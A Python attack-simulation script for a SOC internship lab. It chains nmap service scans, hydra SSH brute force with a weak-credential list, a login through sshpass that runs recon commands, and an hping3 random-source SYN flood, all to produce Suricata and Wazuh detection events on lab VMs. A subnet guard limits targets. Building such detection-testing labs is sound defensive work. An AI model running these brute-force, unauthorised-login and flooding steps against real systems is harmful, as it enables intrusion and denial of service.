#!/usr/bin/env python3
"""
OCP Cloud Security Lab - Attack Simulation Orchestrator
=========================================================
Run FROM the Kali attacker node against your own lab VMs ONLY
(VM1 10.0.3.10 Ubuntu / VM2 10.0.3.11 Debian / VM3 10.0.3.12 Windows10-SSH)

Phases:
  1. Recon          -> nmap (service/version scan, SSH enum)
  2. Brute force     -> hydra against SSH using a small weak-creds wordlist
  3. Unauthorized access -> attempt to SSH in with any creds hydra found,
                       run a few "noisy" commands an attacker would run first
  4. DoS / flood     -> hping3 SYN flood against port 22 (Suricata DDoS/flood rules)

This is a WRAPPER around standard tools (nmap, hydra, hping3, sshpass/paramiko).
It does not contain exploit code or custom payloads. All actions are logged
to a local JSON + text log for correlation with Suricata eve.json and the
Wazuh dashboard.

LEGAL / SCOPE NOTE:
Only ever point this at hosts you own/control in an isolated lab (RFC1918
ranges like 10.0.3.0/24 here). Running this against anything else is illegal
and is explicitly out of scope for this script.

Author: generated for OCP Khouribga internship SOC lab
"""

import argparse
import json
import logging
import os
import shutil
import subprocess
import sys
import time
import ipaddress
from datetime import datetime, timezone
from pathlib import Path

# ----------------------------------------------------------------------------
# Config
# ----------------------------------------------------------------------------

ALLOWED_LAB_NETWORKS = ["10.0.0.0/16"]  # VNet Cloud OCP range from your diagram

DEFAULT_TARGETS = {
    "vm1-ubuntu": "10.0.3.10",
    "vm2-debian": "10.0.3.11",
    "vm3-win10": "10.0.3.12",
}

# Small built-in weak-credential list (intentionally tiny + obviously "default/weak"
# for a controlled lab demo — NOT a real wordlist attack tool).
WEAK_USERS = ["root", "admin", "ubuntu", "test", "azureuser"]
WEAK_PASSWORDS = ["123456", "password", "admin123", "toor", "changeme", "P@ssw0rd"]

LOG_DIR = Path("./logs")
RUN_TS = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")

# ----------------------------------------------------------------------------
# Logging setup
# ----------------------------------------------------------------------------

def setup_logging():
    LOG_DIR.mkdir(exist_ok=True)
    log_file = LOG_DIR / f"attack_sim_{RUN_TS}.log"

    logger = logging.getLogger("ocp_attack_sim")
    logger.setLevel(logging.DEBUG)

    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")

    fh = logging.FileHandler(log_file)
    fh.setFormatter(fmt)
    fh.setLevel(logging.DEBUG)

    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    ch.setLevel(logging.INFO)

    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger, log_file


logger, LOG_FILE = setup_logging()
EVENTS = []  # structured event log -> dumped to JSON at the end


def record_event(phase, target, action, result, extra=None):
    EVENTS.append({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "phase": phase,
        "target": target,
        "action": action,
        "result": result,
        "extra": extra or {},
    })


# ----------------------------------------------------------------------------
# Safety: hard guardrail so this can only ever hit your lab subnet
# ----------------------------------------------------------------------------

def assert_target_in_lab(ip: str):
    addr = ipaddress.ip_address(ip)
    for net in ALLOWED_LAB_NETWORKS:
        if addr in ipaddress.ip_network(net):
            return
    raise SystemExit(
        f"[SAFETY STOP] {ip} is NOT inside an allowed lab network {ALLOWED_LAB_NETWORKS}. "
        f"Refusing to attack it. Edit ALLOWED_LAB_NETWORKS only for your own isolated lab."
    )


def check_tool(name: str) -> bool:
    found = shutil.which(name) is not None
    if not found:
        logger.warning(f"Tool '{name}' not found on PATH. Install it (e.g. `sudo apt install {name}`).")
    return found


def run_cmd(cmd: list, timeout=120):
    """Run a command, return (returncode, stdout, stderr). Never raises on non-zero exit."""
    logger.debug(f"$ {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return proc.returncode, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except FileNotFoundError:
        return -2, "", f"{cmd[0]} not installed"


# ----------------------------------------------------------------------------
# Phase 1: Recon (nmap)
# ----------------------------------------------------------------------------

def phase_recon(target_name, ip, fast=False):
    logger.info(f"=== [RECON] {target_name} ({ip}) ===")
    assert_target_in_lab(ip)

    if not check_tool("nmap"):
        record_event("recon", ip, "nmap_scan", "skipped_tool_missing")
        return None

    out_xml = LOG_DIR / f"nmap_{target_name}_{RUN_TS}.xml"

    args = ["-sV", "-p", "22", "--open", "-oX", str(out_xml)]
    if fast:
        args = ["-T4"] + args
    cmd = ["nmap"] + args + [ip]

    rc, out, err = run_cmd(cmd, timeout=180)
    logger.info(out.strip() or err.strip())

    open_ssh = "22/tcp open" in out
    record_event(
        "recon", ip, "nmap_service_scan",
        "ssh_open" if open_ssh else "no_ssh_found",
        {"returncode": rc, "xml_report": str(out_xml)},
    )
    return open_ssh


# ----------------------------------------------------------------------------
# Phase 2: Brute force (hydra against SSH)
# ----------------------------------------------------------------------------

def write_temp_wordlists():
    users_file = LOG_DIR / "users.txt"
    pass_file = LOG_DIR / "passwords.txt"
    users_file.write_text("\n".join(WEAK_USERS) + "\n")
    pass_file.write_text("\n".join(WEAK_PASSWORDS) + "\n")
    return users_file, pass_file


def phase_bruteforce(target_name, ip, users_file, pass_file, threads=4):
    logger.info(f"=== [BRUTE FORCE] {target_name} ({ip}) - SSH ===")
    assert_target_in_lab(ip)

    if not check_tool("hydra"):
        record_event("bruteforce", ip, "hydra_ssh", "skipped_tool_missing")
        return None

    cmd = [
        "hydra",
        "-L", str(users_file),
        "-P", str(pass_file),
        "-t", str(threads),
        "-f",                      # stop on first valid pair found (per task semantics)
        "-o", str(LOG_DIR / f"hydra_{target_name}_{RUN_TS}.txt"),
        f"ssh://{ip}",
    ]

    rc, out, err = run_cmd(cmd, timeout=300)
    logger.info(out.strip()[-2000:] or err.strip())

    found_cred = None
    for line in out.splitlines():
        if "login:" in line and "password:" in line:
            # typical hydra success line: "[22][ssh] host: x.x.x.x   login: root   password: toor"
            try:
                login = line.split("login:")[1].split("password:")[0].strip()
                pwd = line.split("password:")[1].strip()
                found_cred = (login, pwd)
            except IndexError:
                pass

    record_event(
        "bruteforce", ip, "hydra_ssh_bruteforce",
        "credentials_found" if found_cred else "no_valid_credentials",
        {"returncode": rc, "credential": found_cred},
    )
    return found_cred


# ----------------------------------------------------------------------------
# Phase 3: Unauthorized access attempt (use found creds, or try one known-bad
# pair anyway so Wazuh/Suricata still see an auth attempt + login if it's a
# deliberately weak lab account)
# ----------------------------------------------------------------------------

def phase_unauthorized_access(target_name, ip, credential):
    logger.info(f"=== [UNAUTHORIZED ACCESS] {target_name} ({ip}) ===")
    assert_target_in_lab(ip)

    if credential is None:
        logger.info("No credential available from brute force phase - attempting a single "
                     "known weak pair anyway to generate an auth-failure event.")
        user, pwd = WEAK_USERS[0], WEAK_PASSWORDS[0]
    else:
        user, pwd = credential

    if not check_tool("sshpass"):
        logger.warning("sshpass not found - install with `sudo apt install sshpass` "
                        "to actually attempt the login. Logging attempt as skipped.")
        record_event("unauthorized_access", ip, "ssh_login_attempt", "skipped_tool_missing",
                     {"user": user})
        return False

    cmd = [
        "sshpass", "-p", pwd,
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-o", "ConnectTimeout=8",
        f"{user}@{ip}",
        # Harmless recon-style commands a real intruder runs first - read-only, no changes
        "id; whoami; uname -a; w; exit",
    ]

    rc, out, err = run_cmd(cmd, timeout=30)
    success = (rc == 0)
    logger.info(out.strip() or err.strip())

    record_event(
        "unauthorized_access", ip, "ssh_login_and_recon_commands",
        "success" if success else "auth_failed",
        {"user": user, "returncode": rc},
    )
    return success


# ----------------------------------------------------------------------------
# Phase 4: DoS-style SYN flood (hping3) against SSH port - triggers Suricata
# flood/DDoS signatures
# ----------------------------------------------------------------------------

def phase_synflood(target_name, ip, duration=15, port=22):
    logger.info(f"=== [SYN FLOOD] {target_name} ({ip}):{port} for {duration}s ===")
    assert_target_in_lab(ip)

    if not check_tool("hping3"):
        record_event("dos_synflood", ip, "hping3_synflood", "skipped_tool_missing")
        return

    if os.geteuid() != 0:
        logger.warning("hping3 raw sockets need root. Re-run this script with sudo for this phase.")
        record_event("dos_synflood", ip, "hping3_synflood", "skipped_needs_root")
        return

    cmd = [
        "timeout", str(duration),
        "hping3", "-S", "-p", str(port), "--flood", "--rand-source", ip,
    ]
    logger.info(f"$ {' '.join(cmd)}  (this is intentionally noisy/loud on the wire)")
    rc, out, err = run_cmd(cmd, timeout=duration + 10)

    record_event(
        "dos_synflood", ip, "hping3_syn_flood",
        "completed" if rc in (0, 124) else "error",
        {"duration_s": duration, "port": port, "returncode": rc},
    )


# ----------------------------------------------------------------------------
# Report
# ----------------------------------------------------------------------------

def write_report():
    report_path = LOG_DIR / f"attack_sim_report_{RUN_TS}.json"
    with open(report_path, "w") as f:
        json.dump(EVENTS, f, indent=2)
    logger.info(f"Structured event report written to {report_path}")
    logger.info(f"Full text log written to {LOG_FILE}")
    logger.info("Cross-reference these timestamps (UTC) against:")
    logger.info("  - Suricata: /var/log/suricata/eve.json on the Security Server VM")
    logger.info("  - Wazuh dashboard: Security Events, filter by agent + time range")
    return report_path


# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="OCP SOC lab attack simulation orchestrator (nmap -> hydra -> ssh -> hping3). "
                    "Targets your own lab VMs only."
    )
    parser.add_argument("--targets", nargs="+", default=None,
                         help="IPs to attack. Default: all 3 lab VMs from the architecture diagram.")
    parser.add_argument("--skip-flood", action="store_true",
                         help="Skip the hping3 SYN flood phase (still does recon/bruteforce/access).")
    parser.add_argument("--flood-duration", type=int, default=15,
                         help="Seconds to run the SYN flood per target (default 15).")
    parser.add_argument("--threads", type=int, default=4,
                         help="Hydra parallel threads (keep low in a small lab, default 4).")
    parser.add_argument("--delay", type=int, default=5,
                         help="Seconds to wait between phases, for cleaner log correlation.")
    args = parser.parse_args()

    if args.targets:
        targets = {f"target-{i}": ip for i, ip in enumerate(args.targets, 1)}
    else:
        targets = DEFAULT_TARGETS

    logger.info("OCP Attack Simulation - starting run %s", RUN_TS)
    logger.info("Targets: %s", targets)

    for ip in targets.values():
        assert_target_in_lab(ip)

    users_file, pass_file = write_temp_wordlists()

    for name, ip in targets.items():
        print("\n" + "=" * 70)
        logger.info(f"### TARGET: {name} ({ip}) ###")

        ssh_open = phase_recon(name, ip)
        time.sleep(args.delay)

        if ssh_open is False:
            logger.info(f"SSH not detected open on {ip} - skipping brute force/access/flood for this host.")
            continue

        cred = phase_bruteforce(name, ip, users_file, pass_file, threads=args.threads)
        time.sleep(args.delay)

        phase_unauthorized_access(name, ip, cred)
        time.sleep(args.delay)

        if not args.skip_flood:
            phase_synflood(name, ip, duration=args.flood_duration)
        else:
            logger.info("SYN flood phase skipped (--skip-flood).")

    write_report()
    logger.info("Run complete.")


if __name__ == "__main__":
    main()
